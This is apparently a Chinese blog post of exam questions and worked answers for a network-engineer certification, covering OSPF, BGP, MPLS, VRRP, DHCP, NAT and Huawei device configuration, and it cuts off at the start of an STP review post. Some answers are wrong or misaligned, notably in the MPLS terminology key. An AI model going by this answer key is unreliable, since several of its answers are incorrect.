alt="img"></p><blockquote><p>问题1（6分）以路由器R1为例，进行配置，根据要求，补齐以下配置。</p></blockquote><p>答：</p><pre><code class="hljs shell">[R1] ospf 1 router-id 1.1.1.1   # (1)配置ospf进场及router-id[R1-ospf1] area 1   # (2)进入区域配置视图[R1-ospf1-area-0.0.0.1] network 12.1.1.0 0.0.0.255 # (3)宣告 GE0/0接口地址所在网络[R1-ospf1-area-0.0.0.1] quit[R1] int LoopBack 0[R1-LoopBack0] ospf enable area 3 # (4)宣告LoopBack0接口到ospf[R1] display ospf peer brief # (5)显示结果如下所示OSPF Proccess 1 with Router ID 1.1.1.1peer Statistic informationArea id interface       Neighbor id state0.0.0.1 g0/0            2.2.2.2     Full[R1] display ospf lsdb # (6)显示结果如下所示OSPF Proccess 1 with Router ID 1.1.1.1Link State DatabaseArea:: 0.0.0.1Type    LinkStateID     AdvRouter       Age     Len     Sequence    MetricRouter  2.2.2.2         2.2.2.2         1149    36      8000000004  1language-shell复制代码</code></pre><blockquote><p>问题2（4分）当上述4台路由器均正确配置接口IP地址，建立OSPF邻居关系，并将接口宣告到规划区域，完成OSPF路由收敛后，在路由器R1上执行ping -a 192.168.0.1 34.1.1.4，结果显示“Request time out”，请说明原因，并简要说明如何解决改故障（非静态路由解决措施）。</p></blockquote><p>答：在部署OSPF时，要求所有的非骨干区域与骨干区域相连，否则会出现有的区域不可达的问题，Area 3和骨干区域Area 0非直连，可以在R1和R2之间建立虚连接来解决该问题。</p><blockquote><p>问题3（6分）所有路由器都完成相关配置后，R1~R4互通，R4和R5互通，但是路由器R1上执行ping -a 12.1.1.1 172.16.0.2，结果显示“Request time out”。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250427093158203.png" alt="LSA"></p><p>LSA</p><pre><code class="hljs shell">请补齐以下代码片段，实现R1和R5互通。[R4-ospf-1] （7） # 在R4将外部路由引入OSPF完成上述配置后，还需要在R5进行配置（8）才能实现R1和R5互通。在R4将外部路由引入到OSPF时，R4会成为（9）路由器，R4会触发2条LSU，第一条LSU携带自身的Type 1 LSA，且ASBR置位，R3收到这条LSA后，会转换为（10）LSA，传递到其他区域；第二条LSU携带（11）LSA，起作用是（12）。language-shell复制代码</code></pre><p>答：</p><pre><code class="hljs bash">（7）import-route direct（8）静态路由（9）ASBR（10）4类（11）5类（12）描述到AS外部的路由</code></pre><blockquote><p>问题4（4分）请简要概述当OSPF的非骨干区域配置为stub特殊区域后LSA的变化。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250427093657667.png" alt="区域"></p><p>区域</p><p>答：不会有4类、5类的LSA，但是会生成一条3类LSA。</p><h2 id="2024年5月-1"><a href="#2024年5月-1" class="headerlink" title="2024年5月"></a>2024年5月</h2><ul><li>试题一（20分）</li></ul><p>某高校网络拓扑如下图所示，两校区核心（CORE-1、CORE-2），出口防火墙（NGFW-1、NGFW-2）通过校区间光缆互联，配置OSPF实现全校路由收敛，两校区相距40km。两校区默认由本地出口进行互联网访问。</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250427094539760.png" alt="拓扑图"></p><p>拓扑图</p><blockquote><p>问题1（3分）新校区规划以双栈方式部署IPv6网络，分配的IPv6地址为240C:DB8:1024::&#x2F;49。请将IPv6网络地址规划表补充完整。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250427094727004.png" alt="img"></p><p>理论学习</p><pre><code class="hljs bash"><span class="hljs-comment"># IPv6由128位二进制标准，题目上的表示方式为16进制，共8组，一组16位。：：代表有5组全零的。</span>240C:DB8:1024::/49240C：16位二进制，0010 0100 0000 1010240C:DB8:1024已经是48位了</code></pre><blockquote><p>答：</p></blockquote><pre><code class="hljs bash">（1）240C:DB8:1024::FFFF:FFFF:FFFF:FFFF（2）240C:DB8:1024:4000::~240C:DB8:1024:7FFF:FFFF:FFFF:FFFF:FFFF（3）50</code></pre><blockquote><p>问题2（4分）为实现NGFW-2与NGFW-1、CORE-2正常建立OSPF邻居关系，实现路由全收敛，网络工程师对NGFW-2进行相关配置，请补充完善下列trust到local的配置</p></blockquote><pre><code class="hljs bash">[NGFW-2] firewall zone trust[NGFW-2-zone-trust] add interface GigabitEthernet 0/0/1[NGFW-2-zone-trust] add interface GigabitEthernet 0/0/2[NGFW-2] security-policy[NGFW-2-policy-security] rule name policy_1[NGFW-2-policy-security-policy_1] <span class="hljs-built_in">source</span> zone trust[NGFW-2-policy-security-policy_1] destination-zone (4)[NGFW-2-policy-security-policy_1] source-address (5)[NGFW-2-policy-security-policy_1] service protocol (6)[NGFW-2-policy-security-policy_1] action (7)</code></pre><p>答：</p><pre><code class="hljs bash">(4) <span class="hljs-built_in">local</span>(5) 10.0.0.0/24 <span class="hljs-comment"># 链路聚合：10.0.0.2/30和10.0.0.5/30</span>(6) 89 <span class="hljs-comment"># 如果没有 protocol 就填 ospf</span>(7) permit</code></pre><blockquote><p>问题3（4分）网络工程师收到故障报告，某终端用户可成功获取IP地址，正常访问校内业务，却无法访问Internet。在终端上路由跟踪测试，可正常至NGFW-2，于是在终端上进ping 114.114.114.114测试，结果显示“请求超时”，同时在NGFW-2查看到如下会话：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250427101218473.png" alt="img"></p><p>请分析该故障的原因并提出解决措施。</p><p>答：</p><pre><code class="hljs bash">防火墙的G0/0/4接口指向运营商61.2.7.1地址，而内部地址没有被NAT转换。解决措施是在防火墙上配置基于源地址的NAT转换策略。</code></pre><blockquote><p>问题4（3分）网络工程师街道故障报告，某终端用户网络时通时断，无法正常上网。在用户终端上通过命令测试结果如下：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250427101626227.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250427101734644.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250427101711124.png" alt="img"></p><p>通过上图可以判断网络遭受到了（8）攻击，为解决改故障，网络工程师在用户电脑上配置了静态ARP绑定，同时在设备（9）上配置（10）功能。</p><p>答：（8）ARP欺骗工具 （9 ）CORE-2 (10)ARP防网关冲突攻击</p><blockquote><p>问题5（6分）网络工程师配置NGFW-2作为SSL VPN网关，为网络管理员提供安全远程接入，可以随时随地对校园网内网络进行接入和管理。SSL VPN重发利用SSL协议基于数据证书提供的安全机制，为应用层之间的通信建立安全连接。<br>（1）SSL协议安全机制包括：（11）、数据加密、（12）。<br>（2）数据加解密算法主要分为对称密钥算法、非对称密钥算法，请简要描述SSL协议如何利用这两类算法实现数据传输的机密性（13）。<br>（3）网络工程师在配置SSL VPN之前，需要向（14）申请证书文件，并将其上传至NGFW-2的指定位置。</p></blockquote><p>答：</p><pre><code class="hljs bash">（11）身份验证（12）消息完整性验证（13）客户机发送一个“ClientHello”消息，说明它支持的密码算法列表、压缩方法及最高协议版本，已经一个随机数。    服务器收到后从中选择连接参数，并发送一个“ServerHello”消息。双发知道了连接参数，客户端与服务器交换机证书（依靠被选择的公钥系统）。    服务器请求客户端公钥。客户端有证书即双向身份认证，没有证书时随机生成公钥。客户端与服务器通过公钥保密协议共同的主私钥（双方随机协商），后续的数据均使用这个主密钥进行加密传输。（14）CA</code></pre><ul><li>试题二（20分）</li></ul><p>某单位网络拓扑如下图所示，SW1、SW2为核心层交换机，PC网关配置在核心层，SW3、SW4为接入层交换机，行政部PC划为Vlan10，销售部PC划为Vlan20。</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250428205037520.png" alt="img"></p><blockquote><p>问题1（4分）要实现骨干链路冗余，需要在哪些设备之间增加连线？增加连线后还需要配置什么避免形成二层环路？</p></blockquote><p>答：需要在SW1和SW2、SW1和SW4、SW2和SW3之间增加连线。增加连线后还需要配置生成树协议避免形成二层环路。</p><blockquote><p>问题2（4分）要求vlan10的网关默认配置在SW1上，vlan20的网关默认配置SW2上，当SW1或SW2任意一台设备故障后，不影响PC访问网关，请写出配置要点。</p></blockquote><p>答：</p><pre><code class="hljs bash">1. 设置虚拟网关：vrrp vrid 1 virtual-ip 创建一个VRRP备份组为VRRP配置虚拟网关。2. 设置优先级：vrrp vrid priority命令来配置设备在VRRP备份组中的优先级，将主路由器的优先级设置为120，而备用路由器的优先级设置为100.3. 配置抢占延迟时间：vrrp vrid preempt-mode timer delay命令来配置VRRP备份组中交换机的抢占延迟时间，防止频繁的状态切换。4. 跟踪端口：vrrp vrid track interface 命令来配置VRRP与接口状态联动监视接口功能。如果端口连接断开，VRRP可以降低路由器的优先级，从而确保路由器能够接管网络流量。</code></pre><blockquote><p>问题3（4分）要求配置PC能通过DHCP服务器正常获取IP地址，请写出配置要求。</p></blockquote><pre><code class="hljs bash">1. 配置静态路由或动态路由协议实现PC到DHCP服务器的路由可达。2. 在DHCP服务器上为VLAN10和VLAN20分配创建地址池、网关地址、DNS等。3. SW1和SW2上启用DHCP中继，指向DHCP服务器的IP地址，将街道的DHCP发现和DHCP请求的广播报文进行单播转发到DHCP服务器。</code></pre><blockquote><p>问题4（4分）为加强终端PC安全防护，要求各PC均不能互访，请写出配置要点。</p></blockquote><p>答：</p><pre><code class="hljs bash">1. 在接入层交换机上使用port-isolate mode all命令启用端口隔离功能，实现端口的二层和三层隔离，然后在连接主机的接口配置port-isolate <span class="hljs-built_in">enable</span> group1将接口添加到端口隔离组中。2. 在SW1和SW2上通过ACL或策略路由实现拒绝VLAN10和VLAN20之间的互访。</code></pre><blockquote><p>问题5（4分）请按照IP地址最小范围规划要求完成下表。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250427110634402.png" alt="img"></p><pre><code class="hljs bash">（1）10.0.1.129~10.0.1.157  （2）224（3）10.0.1.193~10.0.1.253  （4）26</code></pre><ul><li>试题三（20分）</li></ul><p>某网络拓扑如下图所示，路由器R1、R2、R3通过OSPF实现网络互通，R1和R3建立IBGP邻居关系，R3和R5建立EBGP邻居关系，R1和R4建立EBGP邻居关系。</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250427110948763.png" alt="img"></p><blockquote><p>问题1（10分）各路由器IP地址等基本参数已正确配置，且R1、R2、R3之间OSPF邻居关系已建立且完成收敛，在R4配置本地环回Lo0模拟ISP地址210.23.3.4&#x2F;32，根据要求完成以下配置。</p></blockquote><pre><code class="hljs shell">[R1] bgp (1) # [R1-bgp] peer (2) as-number (3) # 与R4建立BGP邻居关系 [R1-bgp] peer 10.14.14.4 enable...[R1-bgp] peer 3.3.3.3 next-hop-local # 作用是（4）<span class="hljs-meta prompt_"># </span><span class="language-bash">在R4将210.23.3.4/32引入BGP</span>[R4] bgp 200[R4-bgp] (5) #  将210.23.3.4/32 引入BGP   language-shell复制代码</code></pre><p>答：</p><pre><code class="hljs bash">(1) 100(2) 10.14.14.4(3) 200(4) 设置向IBGP对等体（组）通告路由时，把下一跳属性设为自身的IP地址。(5) network 210.23.3.4 255.255.255.255</code></pre><blockquote><p>问题2（3分）上述配置完成后，路由器R5上210.23.3.4&#x2F;32的路由信息如下图所示，但是无法ping通210.23.3.4，请分析原因。</p></blockquote><p>答：当访问210.23.3.4时，R5查询BGP路由表首先将报文转发到10.35.35.3，R3接收到报文以后查询路由表发现BGP路由的下一跳地址为R1，由于R1并非自己的直连路由，根据OSPF路由表查询到达R1的下一跳地址为R2，当R2收到上述报文后，由于R2没有启用BGP路由协议，所有路由表中无法查询去往210.23.3.4的路由，从而无法转发，于是将数据丢弃，形成“路由黑洞”。</p><blockquote><p>问题3（7分）管理员计划采用BGP路由反射功能解决上述问题。BGP路由反射功能需要遵循如下三条规则：</p></blockquote><pre><code class="hljs bash">1. 从非客户机学到的路由，反射器发布给 <span class="hljs-comment"># (1) </span>2. 从客户机学到的路由，反射器发布给 <span class="hljs-comment"># (2) </span>3. 从eBGP邻居学到的路由，反射器发布给所有的非客户机和客户机。<span class="hljs-comment"># BGP反射器配置片段，配置R1为反射器、R2为客户端。</span><span class="hljs-comment"># ...略去R2和R1建立BGP邻居配置</span>[R1-bgp] reflector cluster-id 12  <span class="hljs-comment"># 该条命令的作用是（3） </span>[R1-bgp] peer (4) reflect-client <span class="hljs-comment">#</span></code></pre><p>答：</p><pre><code class="hljs bash">(1) 所有的客户机(2) 所有的客户机和非客户机(3) 配置路由反射器的集群ID(4) 2.2.2.2</code></pre><ul><li>试题四（15分）</li></ul><p>某公司计划在骨干网络上建立静态MPLS，以便部署L2 VPN或者L3 VPN业务。其网络拓扑结果如下所示。</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250429205440572.png" alt="img"></p><p>问题1（16分）MPLS基于（1）进行转发，进行MPLS标签交换和报文转发的网络设备称为（2），构成MPLS域（MPLSDomain）。位于MPLS域边缘、连接其他网络的LSR称为（3），区域内部的LSR称为核心LSR（CoreLSR）IP报文进入MPLS网络时，MPLS入口设备分析IP报文的内容并为其添加合适的标签，所有MPLS网络中的LSR根据表情转发数据，当该IP报文离开MPLS网络时，标签由出口LER弹出。<br>IP报文在MPLS网络中经过的路径称为（4），LSP是一个单向路径，与数据流的方向一致。LSP的入口LER称为（5），位于LSP中间的LSR称为中间节点（Transit）；LSP的出口LER称为（6）。一条LSP可以有0个、1个或多个中间节点，但有且只有一个入节点和一个出节点。</p><p>答：</p><pre><code class="hljs bash">（1）标签（2）标签交换路由器LSR（LabelSwitchingRouter）（3）入节点（Ingress）（4）边缘路由器LER（LableEdgeRouter）（5）标签交换路径LSP（LabelSwitchedPath）（6）出节点（Egress）</code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250506203617589.png" alt="img"></p><p>问题2（9分）上图中，骨干网络中已完成路由协议配置，各个节点之间可以互通。下面是为该网络配置静态MPLS的代码，请将下面的配置代码补充完整。</p><pre><code class="hljs bash"><span class="hljs-comment"># 使能LSR-1及各接口的MPLS功能</span>[LSR-1] mpls (7) 1.1.1.9 <span class="hljs-comment"># </span>[LSR-1] (8) <span class="hljs-comment"># </span>[LSR-1-mpls] quit[LSR-1] interface (9) 100 <span class="hljs-comment"># </span>[LSR-1-Vlanif100] mpls[LSR-1-Vlanif100] quit<span class="hljs-comment"># 创建从LSR-1到LSR-3的静态LSP</span>[LSR-1] static-lsp ingress LSP1 destination 3.3.3.9 32 nexthop 172.16.1.2 (10) 20 <span class="hljs-comment"># </span>[LSR-2] static-lsp transit LSP1 incoming-interface vlanif100 in-label (11) nexthop 172.16.2.2 out-label (12) <span class="hljs-comment"># </span>[LSR-3] static-lsp egress LSP1 incoming-interface vlanif200 () 40 <span class="hljs-comment">#</span><span class="hljs-comment"># 创建从LSR-3到LSR-1静态LSP</span>[LSR-3] static-lsp ingress LSP2 destination 1.1.1.9 32 nexthop 172.16.2.1 out-label 30[LSR-2] static-lsp transit LSP2 incoming-interface vlanif200 in-label (13) nexthop 172.16.1.1 out-label (14) <span class="hljs-comment">#</span>[LSR-1] static-lsp egress LSP2 incoming-interface vlanif100 in-label 60</code></pre><p>答：</p><pre><code class="hljs bash">(7) lsr-id(8) mpls(9) vlanif(10) out-label(11) 20(12) 40(13) in-label(14) 30 (15) 60</code></pre><h2 id="2023年11月-1"><a href="#2023年11月-1" class="headerlink" title="2023年11月"></a>2023年11月</h2><ul><li>试题一（15分）</li></ul><p>某企业生产网络拓扑如图1所示。该网络采用静态路由配置，交换机A、B配置VRRP，车间1与车间2之间部署了多台AGV（Automated Guded Vehicle），通过多个Wi-Fi进行数据转发。</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250506172739423.png" alt="img"></p><p>问题1（6分）</p><ol><li>写出PC1的网关地址。</li><li>配置交换机A默认路由。</li><li>配置交换机C到PC1网段的静态路由。</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250521104242339.png" alt="AGV"></p><p>AGV</p><p>答：</p><pre><code class="hljs bash"><span class="hljs-comment"># 1.</span>192.168.20.126/27<span class="hljs-comment"># 2.</span>ip route-static 0.0.0.0 0.0.0.0 11.0.0.1<span class="hljs-comment"># 3.</span>ip route-static 192.168.20.96 255.255.255.224 11.0.0.2ip route-static 192.168.20.96 255.255.255.224 22.0.0.2</code></pre><p>问题2（8分）</p><ol><li>由于生产需要，车间3需要扩充网络接入端口，需要增加1台交换机。新增加的交换机与原交换机可采用哪些连接方式？简要说明这些连接方式的区别和优缺点。</li><li>简要说明交换机A、B互联的配置要点。</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250521105148107.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250521105214261.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250521105235244.png" alt="img"></p><p>答：</p><pre><code class="hljs bash"><span class="hljs-comment"># 1.</span>新增加交换机和原交换机可采用级联和堆叠进行连接。    堆叠：        优点：不会产生性能瓶颈，最大可以支持8层堆叠，提供上百个端口，提高了端口密度。方便管理，网络管理过程中就变成了一个网络设备，只能赋予一个IP地址。        缺点：受设备限制，不同厂家，不同型号，进行堆叠需要特定的设备的支持。受距离限制，因为受到堆叠线缆长度的限制，堆叠的交换机之间的距离要求很近。    级联：        优点：可以延长网络的距离。级联基本上不受设备的限制，不同厂家的设备可以任意级联。        缺点：多个设备的级联会产生级联瓶颈。在网络管理过程中仍然是多个不同的网络设备，不方便统一管理。<span class="hljs-comment"># 2. 配置要点：</span>    将交换机A和B接口的链路类型设置为Trunk类型，交换机A和B再配置VRRP组IP、配置优先级。</code></pre><p>问题3（6分）<br>简要说明AGV工作时可靠性受Wi-Fi信号影响因素有哪些。</p><p>答：</p><pre><code class="hljs bash">影响因素有：无线AP安装位置、与无线AP的距离、障碍物的阻挡、多AP的相互干扰（子信道重叠）、不同AP间漫游、其他无线信号源的干扰、AP发射功率。</code></pre><ul><li>试题二（20分）<br>某企业网络拓扑结果如下图所示，企业内部有两部分用户：生产部、研发部，全网IP地址由DHCP服务器统一分配。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250506173123615.png" alt="img"></p><p>问题1（4分）在Agg-Sw与Core-Sw之间采用OSPF协议，网络工程师小明负责方案实施，在配置完成后，Core-SW和Agg-SW之间无法学习路由。以下为网络工程师的检查结果，请分析故障原因，简要说明在Core SW交换机上如何调整配置以解决该故障。</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250521112114930.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250521112136639.png" alt="img"></p><p>答：</p><pre><code class="hljs bash">原因：Agg-Sw与Core-Sw的OSPF接口网络类型不匹配。Agg-Sw为Broadcast，Core-Sw为P2P。解决方案：在OSPF接口视图下执行ospf network-type命令，将Core-Sw的vlanif10端口类型修改为Broadcast。&lt;HUAWEI&gt; system-view[HUAWEI] interface vlanif 10[HUAWEI-vlanif10] ospf network-type broadcast </code></pre><p>问题2（4分）网络运行中，经常出现网络终端获取到非规划的私有地址而导致无法上网和IP地址冲突的情况。请分析出现这两种现象的原因，并给出解决方案。</p><p>答：</p><pre><code class="hljs bash">原因：可能网络中还有一台非法的DHCP服务器，或者存在攻击者伪造的DHCP服务器。解决方案：部署DHCP snooping，屏蔽接入网络中的非法的DHCP服务器。</code></pre><p>问题3（6分）该企业在网络中使用了VLAN技术，VLAN是将一个物理的LAN在逻辑上划分成多个（1）的通信技术，实现网络隔离。当同一VLAN内地需要网络隔离时，我们可采用交换机的（2）功能，若在配置了二层隔离后，部分主机有互通的需求，则可在需求主机的网关上配置（3）功能。</p><p>答：</p><pre><code class="hljs bash">1. 广播域2. 端口隔离3. 代理ARP</code></pre><p>问题4（6分）该企业激活将原存储系统升级为分布式式存储，原存储设备依旧作为新建分布式存储的一个节点，为保证数据不丢失，采用3副本冗余，新建的分布式存储至少应规划（4）节点（含原存储设备），将原存储设备磁盘的RAID模式修改为（5）模式，加入新建的分布式存储系统，该存储系统通过（6）技术实现数据冗余。</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250521195311554.png" alt="分布式存储"></p><p>分布式存储</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250521195434452.png" alt="img"></p><p>答：</p><pre><code class="hljs bash">4. 3节点5. 副本6. 多副本</code></pre><ul><li>试题三（20分）</li></ul><p>下图为某公司网络拓扑片段，从R1到R2有两条转发路径，下一跳分别为R2和R3。由于R1和R2之间物理距离较远，通过一个二层交换机S1作为中继。假设图中设备已完成接口IP地址配置。</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250506174911870.png" alt="img"></p><p>问题1（2分）从PC1发出目的地址为ISP1的IP报文默认将转发至R2的接口GE2&#x2F;0&#x2F;1，PC1构造帧时，是否需要获得该接口的MAC地址？请说明原因。</p><p>答：</p><pre><code class="hljs bash">不需要，PC1构造以太帧时只需要知道吓一跳的（R1设备的G0/0/1接口）MAC地址即可。</code></pre><p>问题2（10分）假设R2不支持BFD（双向转发检测），要求在R1上使用静态路由与BFD联动技术，实现当R2与S1之间的链路出现故障时，R1能快速感知，并将流量切换到R3的链路上。补全下列命令片段完成R1的相关配置。</p><pre><code class="hljs bash">[R1] bfd <span class="hljs-comment"># 启动BFD功能</span>[R1] quit[R1] bfd R1toR2 <span class="hljs-built_in">bind</span> peer-ip (1) interface GigabitEthernet2/0/1 one-arm-echo <span class="hljs-comment"># (1) 配置R1和R2之间的BFD会话</span>[R1-R1toR2] discriminator <span class="hljs-built_in">local</span> 1 <span class="hljs-comment"># BFD 本地标识符1</span>[R1-R1toR2] <span class="hljs-comment"># (2)提交配置</span>[R1-R1toR2] quit[R1] ip route-static 0.0.0.0 0.0.0.0 GigabitEthernet2/0/1 (3) track (4) R1 to R2 <span class="hljs-comment"># 配置R1的缺省路由，联动BFD使得R1到2的流量优先走R1-&gt;S1-&gt;R2链路，当此链路发生故障时，流量切换到R1-&gt;R3-&gt;R2链路上</span>[R1] ip route-static 0.0.0.0 0.0.0.0 GigabitEthernet2/0/2 10.13.13.3 preference 100 <span class="hljs-comment"># 该条命令的功能是(5)</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250521200533797.png" alt="img"></p><p>答：</p><pre><code class="hljs bash">1. 10.12.12.22. commit3. 10.12.12.24. bfd-session5. 配置从R1-&gt;R3-&gt;R2的静态路由，并降低优先级。</code></pre><p>问题3（8分）路由器R2作为公司接入网关，为内网用户提供双链路都通过静态IP方式接入运营商。要求在R2的两个上行接口配置NAT，使内网用户可以访问Internet。</p><pre><code class="hljs bash"><span class="hljs-comment"># 补全下列命令片段完成R2的相关配置</span>[R2] acl number 3001 <span class="hljs-comment"># 允许内部所有网络通过NAT访问外网</span>[R2-acl-adv-3001] rule 5 permit ip <span class="hljs-built_in">source</span> 10.0.0.0 (6) <span class="hljs-comment"># (6)</span>[R2-acl-adv-3001] quit[R2] interface GigabitEthernet 0/0/1[R2-GigabitEthernet0/0/1] nat (7) 3001 <span class="hljs-comment"># 在GE0/0/1接口配置NAT</span>[R2-GigabitEthernet0/0/1] quit...[R2] ip route-static 0.0.0.0 221.137.0.1[R2] ip route-static 0.0.0.0 210.25.0.1[R2] ip load-balance <span class="hljs-built_in">hash</span> src-ip<span class="hljs-comment"># 上述三条命令的功能是（8）</span></code></pre><p>答：</p><pre><code class="hljs bash">6. 0.255.255.2557. outbound8. 基于R2配置等价路由并基于源IP地址进行负载分担。</code></pre><ul><li>试题四（15分）</li></ul><p>某公司有部门A和部门B两个部门，分别使用C类地址192.168.1.0&#x2F;24和192.168.2.0&#x2F;24两个私有地址段，其中部门A为固定办公区域，部门B为移动办公区域。两个部门均有访问互联网的需求。公司网络的拓扑结构示意如图1所示。</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250506193010111.png" alt="img"></p><p>问题1（4分）在Switch A上为部门A和部门B划分VLAN 10和VLAN 20，在R1上采用单臂路由方式实现VLAN间的通信。请将下面的空白补充完整。</p><pre><code class="hljs bash">&lt;R1&gt; system-view[R1] interface GigabitEthernet 0/0/1.1[R1-GigabitEthernet0/0/1.1] ip address 192.168.1.254 255.255.255.0[R1-GigabitEthernet0/0/1.1] dot1q termination vid 10[R1-GigabitEthernet0/0/1.1] arp broadcast <span class="hljs-built_in">enable</span><span class="hljs-comment"># 为实现网络设计目标，工作人员需要在交换机Switch A上完成了创建VLAN10、VLAN20，为对应VLAN添加接口，设置对应的接口模式；除此以外，为确保网络连通，还需要在交换机SwitchA上完成（4）配置。</span></code></pre><p>答：</p><pre><code class="hljs bash">1. 进入G0/0/1.1子接口视图2. 在子接口GE0/0/1.1上配置Dot1q终结功能，进入去掉VLAN10标记，出来的帧打上VLAN10标记。3. 使能逻辑子接口的ARP广播功能4. 连接路由器的接口为中继端口，允许所有的VLAN10、VLAN20通过。</code></pre><p>问题2（7分）公司计划使用DHCP服务器为两个部门的主机分配IP地址，其主要的配置信息如下表所示。</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250521202246040.png" alt="img"></p><p>网络工程师人员在R1上完成了配置，并测试成功后，输出当前的地址池的配置结果（部分）如下，请将下面的空白补充完整。</p><pre><code class="hljs bash">ip pool ip-pool10gateway-list 192.168.1.254 <span class="hljs-comment"># （5）</span>network 192.168.1.0 mask 255.255.255.0 <span class="hljs-comment"># (6)</span>excluded-ip-address 192.168.1.2 <span class="hljs-comment"># (7)</span>dns-list 192.168.1.2 <span class="hljs-comment"># 配置DHCP客户端使用的DNS服务器的IP地址</span>lease day 30 hour 0 minute 0 <span class="hljs-comment"># (8)</span>domain-name aa.com <span class="hljs-comment"># (9)</span>可以使用（10）命令输出以上配置信息，上述配置信息是对部门（11）配置。</code></pre><p>答：</p><pre><code class="hljs bash">5. 配置DHCP分配客户端的网关IP6. 配置DHCP地址池下可分配的网段地址7. 配置IP地址池中不能参与自动分配的IP地址8. 配置租约信息30天9. 配置域名为aa.com10. display ip pool name ip-pool10 11. A</code></pre><p>问题3（4分）<br>在路由器R1上启用全局DHCP服务，请将下面配置代码补充完整。</p><pre><code class="hljs bash">[R1] dhcp <span class="hljs-comment"># (12)</span>[R1] interface GigabitEthernet0/0/1.1[R1-GigabitEthernet0/0/1.1] dhcp () global <span class="hljs-comment"># 接口工作在全局地址池模式</span>[R1-GigabitEthernet0/0/1.1] quit[R1] interface GigabitEthernet0/0/3[R1-GibaitEthernet0/0/3] ip address 202.112.20.1 255.255.255.252...略...</code></pre><p>答：</p><pre><code class="hljs bash">12. <span class="hljs-built_in">enable</span>13. <span class="hljs-keyword">select</span></code></pre><p>工作区<br>设备间<br>建筑群<br>水平<br>垂直<br>管理</p><h2 id="2023年5月-1"><a href="#2023年5月-1" class="headerlink" title="2023年5月"></a>2023年5月</h2><ul><li>试题1（20分）某企业办公楼拓扑如图1-1所示。该网络中交换机Switch1-Switch4均是二层设备，分布在办公楼的各层，上联采用千兆光纤。核心交换机、防火墙、服务器部署在数据机房，其中核心交换机实现冗余配置。</li></ul><p>问题1（4分）该企业办公网络采用172.16.1.0&#x2F;25地址段，部门终端数量如表1-1所示，请将网络地址规划补充完整。</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250521204037596.png" alt="img"></p><p>答：</p><pre><code class="hljs bash"></code></pre><p>问题2（6分）<br>（1）简要说明图1-1中干线布线与水平布线子系统分别对应的区间。<br>（3）在网络线路施工中应遵循哪些规范？（至少回答4点）</p><p>问题3（6分）若将PC-1</p><hr>]]></content>
      
      
      <categories>
          
          <category> 网络 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>STP</title>
      <link href="/2024/01/27/STP/"/>
      <url>/2024/01/27/STP/</url>
      
        <content type="html"><![CDATA[<h1 id="NA复习"><a href="#NA复习" class="headerlink" title="NA复习"></a>NA复习</h1><ol><li>IP规划. IP地址的作用是寻址；</li><li>路由技术. 高速路上的路标；路由形成的3种方式，直连路由&#x2F;静态路由&#x2F;动态路由.</li><li>静态路由</li><li>OSPF协议</li><li>VLAN技术</li><li>VLAN间通信</li><li>ACL技术</li><li>NAT技术</li></ol><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">关闭系统日志</span>undo info-center enable<span class="hljs-meta prompt_"># </span><span class="language-bash">修改系统语言</span><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">language-mode Chinese</span>language-shell复制代码</code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20240225140752.png" alt="NA实验"></p><p>NA实验</p><h4 id="NA实验"><a href="#NA实验" class="headerlink" title="NA实验"></a>NA实验</h4><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">access</span>port link-type accessport default vlan 10<span class="hljs-meta prompt_"></span><span class="hljs-meta prompt_"># </span><span class="language-bash">trunk</span>port link-type trunkport trunk allow-pass vlan all<span class="hljs-meta prompt_"></span><span class="hljs-meta prompt_"># </span><span class="language-bash">vlanif</span>int vlanif 10ip add 10.1.10.254 24<span class="hljs-meta prompt_"></span><span class="hljs-meta prompt_"># </span><span class="language-bash">单臂路由子接口</span>int g0/0/1.30dot1q termination vid 30arp broadcast enableip address 10.1.30.254 24<span class="hljs-meta prompt_"></span><span class="hljs-meta prompt_"># </span><span class="language-bash">OSPF</span>ospf router-id 2.2.2.2area 0interface g0/0/1ospf enable area 0interface vlanif 10ospf enable area 0interface 